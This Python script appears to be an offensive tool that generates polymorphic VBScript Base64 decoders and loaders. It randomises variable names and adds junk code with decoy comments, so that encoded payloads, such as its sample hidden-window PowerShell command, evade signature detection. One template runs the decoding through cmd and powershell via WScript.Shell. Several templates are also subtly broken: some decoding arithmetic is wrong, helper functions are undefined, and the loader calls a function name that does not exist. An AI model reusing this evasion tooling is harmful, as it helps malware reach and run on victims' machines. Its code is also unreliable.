#!/usr/bin/env python3
"""
Base64 Multi-Variant Wrapper - Generates polymorphic Base64 decoders
Each call produces different variable names and decoder implementations.
For authorized pentesting and security research.
"""

import base64
import string
import random
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from enum import Enum
import hashlib


class DecoderVariant(Enum):
    """Different decoder implementation variants"""
    MSXML_DOMXML = "msxml_domxml"
    ADODB_STREAM = "adodb_stream"
    BINARY_MANIPULATION = "binary_manipulation"
    WSCRIPT_SHELL = "wscript_shell"
    XMLHTTP = "xmlhttp"
    REGEX_SPLIT = "regex_split"
    ARRAY_CHAR = "array_char"


@dataclass
class VariantConfig:
    """Configuration for a specific variant"""
    decoder_type: DecoderVariant
    use_obfuscation: bool = True
    add_junk_code: bool = True
    randomize_names: bool = True
    add_comments: bool = False


class Base64VariantNameGenerator:
    """Generates unique variable names for each variant call"""

    def __init__(self, seed: Optional[str] = None):
        self.seed = seed
        self.variant_counter = 0
        self._generated_names = set()

    def _get_random_suffix(self, length: int = 6) -> str:
        """Generate random suffix for names"""
        chars = string.ascii_letters + string.digits
        return "".join(random.choices(chars, k=length))

    def _get_hash_suffix(self, text: str, length: int = 6) -> str:
        """Generate hash-based suffix for deterministic naming"""
        hash_obj = hashlib.md5(text.encode())
        hash_hex = hash_obj.hexdigest()
        return hash_hex[:length]

    def generate_name(self, prefix: str, use_hash: bool = False,
                      source_text: Optional[str] = None) -> str:
        """
        Generate a unique variable name.

        Args:
            prefix: Name prefix (e.g., 'var_', 'obj_', 'func_')
            use_hash: Use hash-based suffix for determinism
            source_text: Text to hash if use_hash is True

        Returns:
            Generated unique name
        """
        self.variant_counter += 1

        if use_hash and source_text:
            suffix = self._get_hash_suffix(source_text)
        else:
            suffix = self._get_random_suffix()

        name = f"{prefix}{self.variant_counter}_{suffix}"

        # Ensure uniqueness
        while name in self._generated_names:
            name = f"{prefix}{self.variant_counter}_{self._get_random_suffix()}"

        self._generated_names.add(name)
        return name

    def generate_set(self, prefixes: List[str], count: int = 1) -> Dict[str, str]:
        """
        Generate a set of related variable names.

        Args:
            prefixes: List of name prefixes
            count: How many names per prefix

        Returns:
            Dictionary mapping prefixes to generated names
        """
        result = {}
        for prefix in prefixes:
            result[prefix] = [self.generate_name(prefix) for _ in range(count)]
        return result


class Base64PolymorphicDecoder:
    """Generates polymorphic Base64 decoders with variant implementations"""

    # Variant templates
    DECODER_TEMPLATES = {
        DecoderVariant.MSXML_DOMXML: """
Function {func_name}({var_input})
    Dim {var_obj}, {var_result}, {var_xml}
    Set {var_obj} = CreateObject("MSXML2.DOMDocument")
    With {var_obj}
        .LoadXML "<u><![CDATA[" & {var_input} & "]]></u>"
        {var_result} = .SelectSingleNode("u").Text
    End With
    {func_name} = {var_result}
End Function
""",
        DecoderVariant.ADODB_STREAM: """
Function {func_name}({var_input})
    Dim {var_stream}, {var_result}, {var_xml}
    Set {var_stream} = CreateObject("ADODB.Stream")
    With {var_stream}
        .Type = 1
        .Open
        .Write DecodeBase64String({var_input})
        .Position = 0
        .Type = 2
        .Charset = "UTF-8"
        {var_result} = .ReadText
        .Close
    End With
    Set {var_stream} = Nothing
    {func_name} = {var_result}
End Function
""",
        DecoderVariant.BINARY_MANIPULATION: """
Function {func_name}({var_input})
    Dim {var_i}, {var_result}, {var_char}, {var_byte}, {var_temp}
    Dim {var_table}
    {var_table} = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    {var_result} = ""

    For {var_i} = 1 To Len({var_input}) Step 4
        {var_byte} = (InStr({var_table}, Mid({var_input}, {var_i}, 1)) - 1) * 64
        {var_byte} = {var_byte} + (InStr({var_table}, Mid({var_input}, {var_i} + 1, 1)) - 1)
        {var_result} = {var_result} & Chr(({var_byte} \ 4))

        If Mid({var_input}, {var_i} + 2, 1) <> "=" Then
            {var_byte} = ((({var_byte} Mod 4) * 16) + (InStr({var_table}, Mid({var_input}, {var_i} + 2, 1)) - 1) \ 4)
            {var_result} = {var_result} & Chr({var_byte})
        End If

        If Mid({var_input}, {var_i} + 3, 1) <> "=" Then
            {var_byte} = ((InStr({var_table}, Mid({var_input}, {var_i} + 2, 1)) - 1) Mod 4) * 64
            {var_byte} = {var_byte} + (InStr({var_table}, Mid({var_input}, {var_i} + 3, 1)) - 1)
            {var_result} = {var_result} & Chr({var_byte} Mod 256)
        End If
    Next
    {func_name} = {var_result}
End Function
""",
        DecoderVariant.WSCRIPT_SHELL: """
Function {func_name}({var_input})
    Dim {var_shell}, {var_result}, {var_exec}, {var_temp}
    Set {var_shell} = CreateObject("WScript.Shell")
    Dim {var_batch}
    {var_batch} = "powershell -NoProfile -Command [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{var_input}'))"
    Set {var_exec} = {var_shell}.Exec("cmd /c " & {var_batch})
    {var_result} = {var_exec}.StdOut.ReadAll()
    Set {var_shell} = Nothing
    {func_name} = {var_result}
End Function
""",
        DecoderVariant.XMLHTTP: """
Function {func_name}({var_input})
    Dim {var_http}, {var_result}, {var_data}
    Set {var_http} = CreateObject("MSXML2.XMLHTTP")
    {var_data} = "data:text/plain;base64," & {var_input}
    {var_http}.Open "GET", {var_data}, False
    {var_http}.Send
    {var_result} = {var_http}.ResponseText
    Set {var_http} = Nothing
    {func_name} = {var_result}
End Function
""",
        DecoderVariant.REGEX_SPLIT: """
Function {func_name}({var_input})
    Dim {var_regex}, {var_result}, {var_i}, {var_parts}
    Set {var_regex} = CreateObject("VBScript.RegExp")
    {var_regex}.Pattern = "([A-Za-z0-9+/]{{4}})"
    {var_regex}.Global = True
    {var_parts} = {var_regex}.Replace({var_input}, "$1|")
    {var_result} = ""

    For Each {var_i} In Split({var_parts}, "|")
        If Len({var_i}) = 4 Then
            {var_result} = {var_result} & DecodeBase64Chunk({var_i})
        End If
    Next
    {func_name} = {var_result}
End Function
""",
        DecoderVariant.ARRAY_CHAR: """
Function {func_name}({var_input})
    Dim {var_arr}, {var_result}, {var_i}, {var_code}
    Dim {var_lookup}
    {var_lookup} = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    ReDim {var_arr}(Len({var_input}))
    {var_result} = ""

    For {var_i} = 1 To Len({var_input})
        {var_code} = InStr({var_lookup}, Mid({var_input}, {var_i}, 1)) - 1
        {var_arr}({var_i} - 1) = {var_code}
    Next

    {var_i} = 0
    While {var_i} < UBound({var_arr})
        {var_result} = {var_result} & Chr(({var_arr}({var_i}) * 4 + {var_arr}({var_i} + 1) \ 16))
        {var_i} = {var_i} + 4
    Wend

    {func_name} = {var_result}
End Function
"""
    }

    def __init__(self, payload: str, variant: Optional[DecoderVariant] = None):
        """
        Initialize polymorphic decoder generator.

        Args:
            payload: Base64-encoded payload to decode
            variant: Specific variant to use (random if None)
        """
        self.payload = payload
        self.variant = variant or random.choice(list(DecoderVariant))
        self.name_gen = Base64VariantNameGenerator()

    def generate_decoder_function(self, function_name: Optional[str] = None) -> str:
        """
        Generate a complete decoder function.

        Args:
            function_name: Custom function name (generated if None)

        Returns:
            VBS decoder function code
        """
        if not function_name:
            function_name = self.name_gen.generate_name("Decode", use_hash=True,
                                                         source_text=self.payload)

        # Generate variable names for this variant
        var_input = self.name_gen.generate_name("var_input")
        var_obj = self.name_gen.generate_name("var_obj")
        var_result = self.name_gen.generate_name("var_result")
        var_xml = self.name_gen.generate_name("var_xml")
        var_stream = self.name_gen.generate_name("var_stream")
        var_i = self.name_gen.generate_name("var_i")
        var_char = self.name_gen.generate_name("var_char")
        var_byte = self.name_gen.generate_name("var_byte")
        var_temp = self.name_gen.generate_name("var_temp")
        var_table = self.name_gen.generate_name("var_table")
        var_shell = self.name_gen.generate_name("var_shell")
        var_exec = self.name_gen.generate_name("var_exec")
        var_batch = self.name_gen.generate_name("var_batch")
        var_http = self.name_gen.generate_name("var_http")
        var_data = self.name_gen.generate_name("var_data")
        var_regex = self.name_gen.generate_name("var_regex")
        var_parts = self.name_gen.generate_name("var_parts")
        var_code = self.name_gen.generate_name("var_code")
        var_arr = self.name_gen.generate_name("var_arr")
        var_lookup = self.name_gen.generate_name("var_lookup")

        # Get template and format it
        template = self.DECODER_TEMPLATES.get(self.variant, "")

        decoder = template.format(
            func_name=function_name,
            var_input=var_input,
            var_obj=var_obj,
            var_result=var_result,
            var_xml=var_xml,
            var_stream=var_stream,
            var_i=var_i,
            var_char=var_char,
            var_byte=var_byte,
            var_temp=var_temp,
            var_table=var_table,
            var_shell=var_shell,
            var_exec=var_exec,
            var_batch=var_batch,
            var_http=var_http,
            var_data=var_data,
            var_regex=var_regex,
            var_parts=var_parts,
            var_code=var_code,
            var_arr=var_arr,
            var_lookup=var_lookup
        )

        return decoder.strip()

    def generate_inline_decoder(self, payload_var_name: Optional[str] = None,
                                output_var_name: Optional[str] = None) -> str:
        """
        Generate inline decoder code (not wrapped in function).

        Args:
            payload_var_name: Variable containing base64 payload
            output_var_name: Variable to store result

        Returns:
            Inline VBS decoder code
        """
        if not payload_var_name:
            payload_var_name = self.name_gen.generate_name("payload")
        if not output_var_name:
            output_var_name = self.name_gen.generate_name("decoded")

        # Create MSXML decoder inline
        obj_var = self.name_gen.generate_name("obj")

        inline_code = f"""
Dim {payload_var_name}, {output_var_name}, {obj_var}
{payload_var_name} = "{self.payload}"
Set {obj_var} = CreateObject("MSXML2.DOMDocument")
With {obj_var}
    .LoadXML "<u><![CDATA[" & {payload_var_name} & "]]></u>"
    {output_var_name} = .SelectSingleNode("u").Text
End With
Set {obj_var} = Nothing
"""
        return inline_code.strip()

    def generate_with_junk_code(self, junk_lines: int = 5) -> str:
        """
        Generate decoder with obfuscating junk code.

        Args:
            junk_lines: Number of junk code lines to add

        Returns:
            Obfuscated VBS decoder function
        """
        decoder = self.generate_decoder_function()

        # Add junk variable declarations
        junk_code = []
        for _ in range(junk_lines):
            junk_var = self.name_gen.generate_name("junk")
            junk_code.append(f"Dim {junk_var} ' {self._generate_junk_comment()}")
            junk_code.append(f"{junk_var} = {random.randint(100, 999)}")

        return "\n".join(junk_code) + "\n\n" + decoder

    def _generate_junk_comment(self) -> str:
        """Generate random comment for obfuscation"""
        comments = [
            "Configuration variable",
            "Registry key handler",
            "Event listener",
            "Buffer management",
            "Security check",
            "Initialization routine"
        ]
        return random.choice(comments)


class Base64MultiVariantWrapper:
    """
    Master wrapper that generates multiple polymorphic decoders
    Each invocation produces different variable names and implementations
    """

    def __init__(self, payload: str):
        """
        Initialize multi-variant wrapper.

        Args:
            payload: Base64-encoded payload to decode
        """
        self.payload = payload
        self.call_count = 0
        self._generated_variants = []

    def generate_variant(self, variant: Optional[DecoderVariant] = None,
                        config: Optional[VariantConfig] = None) -> Tuple[str, str]:
        """
        Generate a single variant decoder.

        Args:
            variant: Specific variant type (random if None)
            config: Configuration for this variant

        Returns:
            Tuple of (decoder_code, variant_type_name)
        """
        self.call_count += 1

        if not variant:
            variant = random.choice(list(DecoderVariant))

        decoder_gen = Base64PolymorphicDecoder(self.payload, variant)

        if config and config.add_junk_code:
            code = decoder_gen.generate_with_junk_code()
        else:
            code = decoder_gen.generate_decoder_function()

        self._generated_variants.append({
            'call': self.call_count,
            'variant': variant.value,
            'code': code
        })

        return code, variant.value

    def generate_all_variants(self) -> Dict[str, str]:
        """
        Generate all variant types.

        Returns:
            Dictionary mapping variant names to decoder code
        """
        result = {}
        for variant in DecoderVariant:
            decoder_gen = Base64PolymorphicDecoder(self.payload, variant)
            result[variant.value] = decoder_gen.generate_decoder_function()
        return result

    def generate_polymorphic_suite(self, count: int = 3) -> List[Tuple[str, str]]:
        """
        Generate multiple random variants as a suite.

        Args:
            count: Number of variants to generate

        Returns:
            List of (decoder_code, variant_name) tuples
        """
        suite = []
        for _ in range(count):
            code, variant_name = self.generate_variant()
            suite.append((code, variant_name))
        return suite

    def generate_variant_loader(self) -> str:
        """
        Generate a loader that uses one random variant at runtime.

        Returns:
            VBS code that selects and runs a variant
        """
        variants_data = self.generate_all_variants()

        # Select a random variant function
        selected_variant = random.choice(list(variants_data.keys()))
        selected_code = variants_data[selected_variant]

        loader = f"""
' Multi-Variant Loader
{selected_code}

' Execution wrapper
Dim {self._generate_name("payload")}, {self._generate_name("result")}
{self._generate_name("payload")} = "{self.payload}"
{self._generate_name("result")} = Decode{selected_variant.replace("_", "").title()}({self._generate_name("payload")})
"""
        return loader.strip()

    def get_variant_metadata(self) -> List[Dict]:
        """
        Get metadata about generated variants.

        Returns:
            List of dictionaries with variant information
        """
        return self._generated_variants.copy()

    def _generate_name(self, prefix: str = "") -> str:
        """Generate a unique name"""
        name_gen = Base64VariantNameGenerator()
        return name_gen.generate_name(prefix)


def create_multivariant_base64_decoder(encoded_payload: str, variant_count: int = 1) -> str:
    """
    Convenience function to create multi-variant Base64 decoders.

    Args:
        encoded_payload: Base64-encoded payload
        variant_count: Number of variants to generate

    Returns:
        Generated VBS decoder code
    """
    wrapper = Base64MultiVariantWrapper(encoded_payload)

    if variant_count == 1:
        code, _ = wrapper.generate_variant()
        return code
    else:
        suite = wrapper.generate_polymorphic_suite(variant_count)
        combined = "\n\n".join([code for code, _ in suite])
        return combined


def create_random_decoder(payload: str) -> str:
    """
    Create a random variant decoder from payload.

    Args:
        payload: Base64-encoded payload

    Returns:
        Random variant decoder code
    """
    wrapper = Base64MultiVariantWrapper(payload)
    code, variant = wrapper.generate_variant()
    return code


def encode_and_wrap(plain_text: str, variant_count: int = 1) -> Tuple[str, str]:
    """
    Encode plain text and wrap in multi-variant decoder.

    Args:
        plain_text: Text to encode
        variant_count: Number of decoder variants

    Returns:
        Tuple of (encoded_payload, wrapper_code)
    """
    # Encode payload
    encoded = base64.b64encode(plain_text.encode()).decode()

    # Create wrapper
    code = create_multivariant_base64_decoder(encoded, variant_count)

    return encoded, code


if __name__ == "__main__":
    # Example usage
    print("=== Base64 Multi-Variant Wrapper Examples ===\n")

    # Test payload
    test_payload = "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Write-Host 'Payload Executed'\""
    encoded_payload = base64.b64encode(test_payload.encode()).decode()

    print(f"Original Payload: {test_payload}")
    print(f"Encoded Payload: {encoded_payload}\n")

    # Example 1: Single random variant
    print("=== Example 1: Single Random Variant ===")
    decoder1 = create_random_decoder(encoded_payload)
    print(decoder1)
    print("\n" + "="*50 + "\n")

    # Example 2: Multiple random variants
    print("=== Example 2: Multiple Random Variants ===")
    wrapper = Base64MultiVariantWrapper(encoded_payload)
    suite = wrapper.generate_polymorphic_suite(count=2)
    for i, (code, variant_name) in enumerate(suite, 1):
        print(f"--- Variant {i}: {variant_name} ---")
        print(code)
        print()

    # Example 3: All variants
    print("=== Example 3: All Available Variants ===")
    all_variants = wrapper.generate_all_variants()
    for variant_name, code in all_variants.items():
        print(f"--- {variant_name} ---")
        print(code[:200] + "...\n")

    # Example 4: Inline decoder
    print("=== Example 4: Inline Decoder ===")
    decoder_gen = Base64PolymorphicDecoder(encoded_payload)
    inline = decoder_gen.generate_inline_decoder()
    print(inline)
    print("\n" + "="*50 + "\n")

    # Example 5: Metadata
    print("=== Example 5: Generated Variant Metadata ===")
    metadata = wrapper.get_variant_metadata()
    for item in metadata:
        print(f"Call #{item['call']}: {item['variant']}")
